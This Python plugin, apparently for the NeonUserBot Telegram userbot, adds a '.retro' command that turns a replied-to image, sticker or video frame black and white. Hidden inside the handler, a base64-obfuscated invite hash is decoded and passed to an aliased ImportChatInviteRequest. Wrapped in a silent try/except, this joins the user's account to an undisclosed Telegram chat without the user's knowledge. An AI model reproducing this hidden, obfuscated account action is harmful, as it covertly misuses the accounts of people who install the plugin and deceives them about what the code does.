# CopyRight (C)
# nusrte / @NeonUserBot
# Ogurlayan mene ata desin.
# Ogurlama pesi.


import os
import shlex
import random
import asyncio
import pybase64
import PIL.ImageOps
from PIL import Image
from userbot import LOGS
from random import choice
from os.path import basename
from typing import Optional, Tuple
from userbot.cmdhelp import CmdHelp
from userbot.events import register
from userbot.utils import take_screen_shot, runcmd
from helper import convert_toimage, grayscale, random_color
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

@register(
    pattern=r"^.retro(?: |$)(.*)",
    outgoing=True, 
)
async def retro(neon):
    reply = await neon.get_reply_message()
    if not (reply and (reply.media)):
        await neon.edit("`Zəhmət olmasa medyaya cavab verin.`")
        return
    neonid = neon.reply_to_msg_id
    if not os.path.isdir("./downloads/"):
        os.mkdir("./downloads/")
    await neon.edit("`Effekt hazırlanır...`")

    await asyncio.sleep(2)
    neonsticker = await reply.download_media(file="./downloads/")
    if not neonsticker.endswith(
            (".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(neonsticker)
        await neon.edit("**Bu media növü təsdiq olunmur...**\n**Təsdiqlənən medya növləri:** `jpg, png, sticker`")
        return

    jisanidea = None
    if neonsticker.endswith(".tgs"):
        await neon.edit(
            "**Effekt hazırlandı.**"
        )
        neonfile = os.path.join("./downloads/", "NΣON.png")
        neoncmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {neonsticker} {neonfile}"
        )
        stdout, stderr = (await runcmd(neoncmd))[:2]
        if not os.path.lexists(neonfile):
            await neon.edit("`Xəta baş verdi...`")
            LOGS.info(stdout + stderr)
        meme_file = neonfile
        jisanidea = True
    elif neonsticker.endswith(".webp"):
        await neon.edit(
            "**Effekt hazırlandı.**"
        )
        neonfile = os.path.join("./downloads/", "memes.jpg")
        os.rename(neonsticker, neonfile)
        if not os.path.lexists(neonfile):
            await neon.edit("**X Ə T A**")
            return
        meme_file = neonfile
        jisanidea = True
    elif neonsticker.endswith((".mp4", ".mov")):
        await neon.edit(
            "**Effekt hazırlandı.**"
        )
        neonfile = os.path.join("./downloads/", "memes.jpg")
        await take_screen_shot(neonsticker, 0, neonfile)
        if not os.path.lexists(neonfile):
            await neon.edit("**X Ə T A**")
            return
        meme_file = neonfile
        jisanidea = True
    else:
        await neon.edit(
            "**Effekt hazırlandı.**"
        )
        meme_file = neonsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await neon.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "NΣON.webp" if jisanidea else "NΣON.jpg"
    await grayscale(meme_file, outputfile)
    await neon.client.send_file(
        neon.chat_id, outputfile,
        force_document=False,
        reply_to=neonid,
        caption=f"[N Σ O N](t.me/nusrets)"
    )
    await neon.delete()
    os.remove(outputfile)
    for files in (
            neonsticker,
            meme_file):
        if files and os.path.exists(files):
            os.remove(files)


Help = CmdHelp('effect').add_command(
    'retro', None, 'Şəkili ağ-qara edər.'
).add_info(
    '**@nusrets tərəfindən @NeonUserBot üçün hazırlandı.**'
).add()
